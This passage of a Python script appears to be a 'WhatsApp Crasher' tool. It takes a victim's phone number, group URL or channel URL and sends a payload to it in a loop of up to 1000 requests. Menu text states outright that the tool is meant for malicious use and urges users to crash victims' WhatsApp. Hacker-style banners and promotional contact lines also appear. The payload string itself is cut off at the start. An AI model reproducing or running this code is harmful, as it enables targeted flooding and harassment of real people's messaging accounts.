󠀯󠀷󠀷󠀿󠀭󠀶󠀼󠀻󠀹󠀹󠀸󠀸󠁂󠀰󠀱󠀲󠀴󠀴󠀴󠀷󠀷󠁍󠁉󠁉󠁓󠁍󠁎󠁎󠁠󠁠󠁛󠁛󠁕󠁞󠁞󠁟󠁟󠁔󠁔󠁔󠁛󠁋󠁋󠁈󠁈󠁈󠁈󠁈󠁂󠁂󠁈󠁈󠁈󠁉󠁌󠁉󠁉󠁊󠁊󠁎󠁎󠁎󠁘󠁘󠁓󠁅󠁅󠁅󠁀󠁀󠁉󠁉󠁉󠁉󠀳󠀳󠀸󠀷󠀸󠀸󠁔󠁊󠁊
                                        """

    worm = {"text":json.dumps(payload),"data":json.dumps(payload)}
    data_size = len(json.dumps(payload).encode("utf-8"))

    if victim[0] == '+':
        data = urllib.parse.urlencode(worm)
        from phonenumbers import is_valid_number
        try: 
            phoneNumber = phonenumbers.parse(victim)
        except Exception as e:
            slow(f"\nError While Parsing Phone Number: {e}{white}\n")
            os.sys.exit()
        if is_valid_number(phoneNumber):
            pass
        else:
            slow(f"\nInvalid Phone Number.{white}\n")
            os.sys.exit()
        victim=phonenumbers.format_number(phoneNumber,phonenumbers.PhoneNumberFormat.E164)
        url = f"https://wa.me/{victim[1:]}?{data}"

    else:
        data = urllib.parse.urlencode(worm)
        url = f"{victim}?{data}"

    try:response = requests.get(url)
    
    except requests.exceptions.ConnectionError:
        slow(f"{red}[-] Please Check Your Internet Connection.{white}\n")
        os.sys.exit()
    except requests.exceptions.ReadTimeout as a:
        slow(f"{red}[-] Read timed out: Seems Like You're Out Of Data.{white}\n")
        os.sys.exit()


    if response.status_code == 200:
        return (True, response.status_code)
    elif response.status_code == 404:
        notFound(url)
    else:
        return (False, response.status_code)
        
        

def multipro(victim):
    i=0
    j=0
    msg = input("[+] Enter message to send: ")
    os.system("clear || cls")
    try:
        slow(f"""{bg}{red}Press Ctrl+C to Stop Attacks\033[0m""")
        for k in range(1000):
            a,c = start_attack(msg,victim)
            if a == True:
                i+=1
            else:
                j+=1
            time.sleep(0.1)
            print(f"{red}\t==> [{i}]",end="\r")

    except KeyboardInterrupt:
        slow(f"\n{red}[-] Attack At Down!{white}              \n")
        time.sleep(3)

    os.system('clear || cls')
    slow(f"""{red}
 __        __ _           _         ____              _   ______            _ 
\ \      / /| |__   __ _| |_ ___  | __ )   __ _  ___| |_/ ___|  __ ___   _| |
 \ \ /\ / / | '_ \ / _` | __/ _ \ |  _ \  / _` |/ __| __\___ \ / _` \ \ / / |
  \ V  V /  | | | | (_| | ||  __/ | |_) || (_| | (__| |_ ___) | (_| |\ V /|_|
   \_/\_/   |_| |_|\__,_|\__\___| |____/  \__,_|\___|\__|____/ \__,_| \_/ (_)
===========================================================
    HAHAHA!. 💀☠💀               
    we are 🎭 anonymous 🤬,   
    we do not forgive 👿,  
    we do not forget 😈,
    expect us 👥 any time 👀.{red}
===========================================================
    Status: OK        
    Server: https://web.whatsapp.com/        
    Victim: {victim}        
    Sent: {i}        
    Failed: {j}        

    Follow Us on Github
    Fork our Repositories  
    Give our Repositories a Star
    Contribute to our Repositories  
    Contact us at jaydenofficial76@gmail.com

           [+] Subscribe To Our YouTube Channel [+]
==========================================================={white}""")
    input(f"{red}Press [ENTER] to Continue...{white}") 
    evilfeonix="https://github.com/xenocrypt01" 
    os.system(f"xdg-open {evilfeonix}")
    print(f"{white}") 
    os.sys.exit()


def main():
    banner()
    slow("    HAHAHA")
    slow("    we are anonymous 🎭")
    slow("    we represent freedom")
    slow("    we oppossed oppression")
    slow("    we are simply an evolution 🧬 of the system technology")
    slow("    were liberty is at risk")
    slow("    expect us")
    slow("===========================================================")
    input("Press Enter to Continue...")

    banner()
    slow("    Welcome to WhatsApp Crasher!, ")
    slow("    Where you can easily crash victim's whatsapp with one click")
    slow("    Feel free to used this tool maliciously but respectively")
    slow("    Becouse, this tool was created and intented for malicious purpose")
    slow("    Note that we as the creators of this malicious program")
    slow("    We are not responsible for all damages couses by this program")
    slow("    LET ACT WICKED AND CRASHES THIRE WHATSAPP... ")
    slow("===========================================================")
    input("Press Enter to Continue...")

    banner()
    slow(" CREATED AND MODIFIED BY MR SMILE CONTACT ON TELEGRAM FOR MORE TOOLS 🌎")
    slow("    [00] Exit This Tool ")
    slow("    [01] About This Tool ")
    slow("    [02] Update This Tool ")
    slow("    [03] Crash WhatsApp User ")
    slow("    [04] Crash WhatsApp Group ")
    slow("    [05] Crash WhatsApp Channel ")
    ec = input("    \n[Enter Choice]>> ")

    if ec in ['00','0']:
        banner()
        slow(f'[-] Thanks for Using our WhatsApp Crashing Tool')
        slow(f"""
    Follow Us on Github
    Fork our Repositories  
    Give our Repositories a Star
    Contribute to our Repositories  
    Contact us at jaydenofficial@gmail.com 

           [+] Subscribe To Our YouTube Channel [+]
==========================================================={white}""")
        input(f"{red}Press [ENTER] to Continue{white}") 
        evilfeonix="https://github.com/" 
        os.system(f"xdg-open {evilfeonix}")
        print(f"{white}") 
        os.sys.exit()
    elif ec in ['01','1']:
        banner()
        aboutus()
    elif ec in ['02','2']:
        os.system("clear || cls")
        banner()
        updateus()
    elif ec in ['03','3']:
        os.system("clear || cls")
        banner()
        cncode = input('[+] Enter Victims Country Code withOut "+" eg.254: ')
        number = input("[+] Enter Victims Phone Number: ")
        if cncode.strip() == "" or number.strip() == "":
            slow("[!] Country Code or Phone Number Can't be Empty!")
            slow(f"[!] Please Make Sure You Provide Them.{white}\n")
            os.sys.exit()
        num = f"+{cncode}{number}"
        multipro(num)
    elif ec in ['04','4']:
        os.system("clear || cls")
        banner()
        url = input('[+] Copy and Paste WhatsApp Group URL Here: ')
        if url.strip() == "":
            slow("[!] WhatsApp Group URL Can't be Empty!")
            slow(f"[!] Please Make Sure You Provide It.{white}\n")
            os.sys.exit()
        multipro(url)
    elif ec in ['05','5']:
        os.system("clear || cls")
        banner()
        url = input('[+] Copy and Paste WhatsApp Channel URL Here: ')
        if url.strip() == "":
            slow("[!] WhatsApp Channel URL Can't be Empty!")
            slow(f"[!] Please Make Sure You Provide It.{white}\n")
            os.sys.exit()
        multipro(url)
    else:
        slow(f'[-] Invalid Choice...{white}\n')
        os.sys.exit()
    
    
if __name__ == "__main__":
   try:
      main()
   except KeyboardInterrupt:
      slow(f"")
      slow(f"{err} User Requested an Interrupt!")
      slow(f"{err} Program Running Down...{white}")
      time.sleep(2)
      slow(f"")
      os.sys.exit()

